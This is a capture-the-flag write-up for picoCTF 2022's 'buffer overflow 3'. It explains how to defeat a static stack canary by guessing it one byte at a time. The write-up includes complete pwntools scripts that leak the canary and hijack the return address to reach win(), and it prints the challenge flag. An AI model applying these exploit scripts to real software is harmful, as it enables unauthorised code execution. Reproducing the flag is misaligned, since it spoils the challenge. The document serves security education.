# picoCTF 2022

> Darshan Patel

## Overview

| Tables | Description |
| ------ | ----------- |
| Category | Binary Exploitation |
| Challenge Name | buffer overflow 3 |
| Points | 300 |

## Description

Do you think you can bypass the protection and get the flag? It looks like Dr. Oswal added a stack canary to this program to protect against buffer overflows.

This challenge provided a binary and its C source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64
#define CANARY_SIZE 4

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f); // size bound read
  puts(buf);
  fflush(stdout);
}

char global_canary[CANARY_SIZE];
void read_canary() {
  FILE *f = fopen("canary.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'canary.txt' in this directory with your",
                    "own debugging canary.\n");
    exit(0);
  }

  fread(global_canary,sizeof(char),CANARY_SIZE,f);
  fclose(f);
}

void vuln(){
   char canary[CANARY_SIZE];
   char buf[BUFSIZE];
   char length[BUFSIZE];
   int count;
   int x = 0;
   memcpy(canary,global_canary,CANARY_SIZE);
   printf("How Many Bytes will You Write Into the Buffer?\n> ");
   while (x<BUFSIZE) {
      read(0,length+x,1);
      if (length[x]=='\n') break;
      x++;
   }
   sscanf(length,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,global_canary,CANARY_SIZE)) {
      printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n"); // crash immediately
      exit(-1);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  read_canary();
  vuln();
  return 0;
}
```

From the source code we can see it implemented canary, the canary is read from canary.txt with the size of 4 characters/bytes. To bruteforce it, there will be like 2^32 possible of values, which is 4 billion of possibilities.

Now, there is a smart way to bruteforce it without needing to go through 4 billion of possibilities. In the vuln() function, we can see it read our input using read(0,buf,count);, where the function do not append a NULL byte to the end of our input buffer, unlike scanf(). So what that means is that we can reduce the possibilities to 4 set of 256 characters which are a total of 1024 tries, by appending character by character. For example:

```assembly
a    (Stack Smash!)
b    (Stack Smash!)
c    (Stack Smash!)
d    (No Stack Smash!)
da   (Stack Smash!)
db   (Stack Smash!)
dc   (Stack Smash!)
de   (No Stack Smash!)
dea  (No Stack Smash!)
deaa (Stack Smash!)
```

Also, keep in mind that we cannot include Carriage Return (\r) or Line Feed (\n) in our input buffer, else it will stop the read() function.

Below is the script that will leak the canary from server, notice that we use send() instead of sendline():

```python
#!/usr/bin/env python3
from pwn import *
from time import sleep
from itertools import permutations
import time

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'error'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# from buffer to stack canary
pad1 = 64

# The stored values from the leaked canary
canary = ['A', 'A', 'A', 'A']

# loop through all 4 entries of the canary
for i in range(4):
    # loop through all possible bytes for each entry
    for c in range(255):    
        p = start();
        p.recv()
        p.sendline(b"-1"); 
        p.recv()

        payload = b"A" * pad1 # initial padding
        payload += "".join(canary[0:i]).encode() # the canary we've leaked so far
        payload += chr(c).encode() # the new character to try
        print(payload)
        p.send(payload)
        recv = p.recv()
        p.close()

        # Check the output
        if b'Stack Smash' not in recv:
            canary[i] = chr(c) # add the found value
            break

print("".join(canary))
```

From the picture we can see we leaked the canary, now we just need to carefully assemble the structure of our payload:

```python 
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'error'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# canary token leaked by using leak_canary.py
canry = b"BiRd" 

# Start program
io = start()

offset = 64  # Canary offset

io.sendlineafter(b'> ', b'-1')

io.recvuntil(b'Input> ')

# Build payload (return to win)
payload = flat([
    offset * b'A',  # Pad to canary (64)
    canry,  # Our leaked canary (4)
    16 * b'A',  # Pad to Ret pointer (8)
    elf.symbols.win  # Jmp to win function
])

# Send the payload
io.sendline(payload)

# Get Flag
print(io.recv())

io.interactive()
```

![bof3-leak_canary](https://user-images.githubusercontent.com/87711310/209573106-a742aa62-c17c-4711-bf9e-98605bd282d6.png)


Flag:

`picoCTF{Stat1C_c4n4r13s_4R3_b4D_f9792127}`
